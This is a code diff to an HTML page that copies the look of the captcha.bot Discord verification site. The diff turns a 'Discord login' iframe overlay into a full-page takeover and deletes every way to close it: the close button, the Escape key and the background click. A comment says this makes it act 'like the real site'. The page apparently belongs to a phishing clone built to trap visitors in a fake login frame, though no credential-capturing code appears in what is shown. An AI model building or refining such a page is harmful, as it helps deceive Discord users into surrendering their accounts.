@@ -19,23 +19,15 @@
   .animate-spin { animation: spin 1s linear infinite; }
   .fill-discord { fill: #5865F2; }
 
-  /* iframe overlay */
+  /* iframe overlay — full-page like real captcha.bot */
   #discord-overlay {
     display:none; position:fixed; inset:0; z-index:9999;
-    background:rgba(0,0,0,0.85); justify-content:center; align-items:center;
+    background:rgba(0,0,0,0); justify-content:center; align-items:center;
   }
   #discord-overlay.active { display:flex; }
   #discord-overlay iframe {
-    width:100%; max-width:480px; height:90vh; max-height:700px;
-    border:none; border-radius:8px; background:#313338;
+    width:100%; height:100%; border:none; background:#313338;
   }
-  #overlay-close {
-    position:absolute; top:16px; right:24px; width:32px; height:32px;
-    background:#393941; border-radius:50%; color:rgba(255,255,255,0.7);
-    font-size:20px; cursor:pointer; display:flex; align-items:center; justify-content:center;
-    border:none; font-weight:400; line-height:1; z-index:10000;
-  }
-  #overlay-close:hover { background:#4e4f57; color:#fff; }
 </style>
 </head>
 <body class="min-h-screen">
@@ -103,10 +95,11 @@
     <div class="flex gap-3 pb-2">
       <div class="flex items-start w-full">
         <h1 class="text-white text-lg font-extrabold flex-1">Advertise here...</h1>
-        <div class="bg-discord px-2 py-1 text-white text-sm font-semibold rounded-lg">AD</div>
+        <div class="bg-yellow-500/20 text-yellow-400 px-2 py-0.5 text-xs font-semibold rounded">Promoted</div>
       </div>
     </div>
     <p class="pb-2 text-gray-300 text-sm">Advertise your Discord server, bot, or other product directly on captcha.bot verification pages.</p>
+    <p class="pb-3 text-gray-500 text-xs">Coming Q3 2024</p>
     <a href="https://captcha.bot/advertise" class="block bg-discord hover:bg-discord-10 rounded-lg shadow-lg text-white text-center text-sm py-1.5 px-2 font-semibold w-full">Join the waitlist</a>
   </div>
 
@@ -150,14 +143,13 @@
       </div>
     </div>
     <div class="mt-8 border-t border-gray-700 pt-8">
-      <p class="text-base text-gray-400">&copy; 2024 Privy.gg LLC. Not affiliated with Discord Inc.</p>
+      <p class="text-base text-gray-400">&copy; 2021-2025 Privy.gg LLC. Not affiliated with Discord Inc.</p>
     </div>
   </div>
 </footer>
 
-<!-- DISCORD LOGIN OVERLAY -->
+<!-- DISCORD LOGIN OVERLAY (full-page iframe) -->
 <div id="discord-overlay">
-  <button id="overlay-close" onclick="closeDiscordLogin()">&times;</button>
   <iframe id="discord-iframe" src="" allow="clipboard-write"></iframe>
 </div>
 
@@ -169,21 +161,7 @@ function openDiscordLogin() {
   overlay.classList.add('active');
   document.body.style.overflow = 'hidden';
 }
-function closeDiscordLogin() {
-  var overlay = document.getElementById('discord-overlay');
-  var iframe = document.getElementById('discord-iframe');
-  overlay.classList.remove('active');
-  iframe.src = '';
-  document.body.style.overflow = '';
-}
-// Close on escape
-document.addEventListener('keydown', function(e) {
-  if (e.key === 'Escape') closeDiscordLogin();
-});
-// Close on overlay background click
-document.getElementById('discord-overlay').addEventListener('click', function(e) {
-  if (e.target === this) closeDiscordLogin();
-});
+/* No close function — iframe takes over the full page like the real site */
 
 // Parse URL data parameter (base64 JSON with guildId, name, members, icon)
 (function() {
